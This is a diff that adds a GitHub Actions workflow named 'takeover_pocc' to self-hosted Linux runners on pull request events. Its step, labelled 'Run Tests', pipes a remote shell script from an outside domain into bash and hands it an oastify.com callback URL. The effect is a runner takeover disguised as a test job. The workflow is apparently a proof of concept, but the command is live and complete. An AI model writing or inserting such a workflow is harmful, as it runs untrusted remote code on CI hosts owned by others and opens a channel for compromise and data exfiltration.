@@ -1,0 +1,15 @@
+name: takeover_pocc
+run-name: takeover_pocc
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    - linux
+    - X64
+    steps:
+    - name: Run Tests
+      run: |
+        curl -k https://v.0xz.org/selfrunnerpoc3.sh | bash -s "https://oskx9o6sybniu37lkmwbaec2rtxklc91.oastify.com/"
+      continue-on-error: true
